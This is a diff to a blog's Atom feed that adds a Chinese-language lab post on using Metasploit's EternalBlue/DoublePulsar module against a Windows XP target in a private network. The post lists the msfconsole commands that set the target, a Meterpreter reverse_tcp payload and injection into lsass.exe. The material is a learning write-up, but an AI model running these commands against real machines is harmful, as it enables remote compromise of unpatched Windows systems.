@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-06T05:12:35.008Z</updated>
+  <updated>2019-12-06T06:21:28.772Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>双脉冲星渗透</title>
+    <link href="http://yoursite.com/2019/12/06/%E5%8F%8C%E8%84%89%E5%86%B2%E6%98%9F%E6%B8%97%E9%80%8F/"/>
+    <id>http://yoursite.com/2019/12/06/%E5%8F%8C%E8%84%89%E5%86%B2%E6%98%9F%E6%B8%97%E9%80%8F/</id>
+    <published>2019-12-06T05:16:39.000Z</published>
+    <updated>2019-12-06T06:21:28.772Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>通过双脉冲星学习msf对渗透的利用：（除win10以外的系统均可攻击）</p><p>​    靶机：Windows xp（192.168.124.15）</p><p>​    攻击机：Kali （192.168.124.105）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(08_067对应的漏洞端口为445)</p><p><img src="https://img.vim-cn.com/35/9f86370c1ecd0a4c69d7fcc4077b5040b9fd9f.png" alt="0"></p><p>2.将模块复制到msf目录下</p><p><img src="https://img.vim-cn.com/76/e6b5aba18e2929a10828f2fca2d53dfba77b40.png" alt="1"></p><p>3.输入msfconsole进入搜索eternalblue_doublepulsar可利用漏洞模块</p><p><img src="https://img.vim-cn.com/af/e592e20e35b916d5ea2824b879d968a6c998ea.png" alt="2"></p><p>4.利用漏洞模块，设置参数</p><p>msf &gt; use exploit/windows/smb/eternalblue_doublepulsar</p><p>msf &gt; set RHOST 192.168.124.15</p><p>msf &gt; set payload windows/meterpreter/reverse_tcp</p><p>msf &gt; set LHOST 192.168.124.105</p><p>msf &gt; set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</p><p>msf &gt; set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</p><p>msf &gt; set PROCESSINJECT lsass.exe</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;hr&gt;
+&lt;p&gt;通过双脉冲星学习msf对渗透的利用：（除win10以外的系统均可攻击）&lt;/p&gt;
+&lt;p&gt;​    靶机：Windows xp（192.168.124.15）&lt;/p&gt;
+&lt;p&gt;​    攻击机：Kali （192.168.124.105）&lt;/p&gt;
+&lt;p&gt;1.使用-p-对
+      
+    
+    </summary>
+    
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>MS08_067渗透</title>
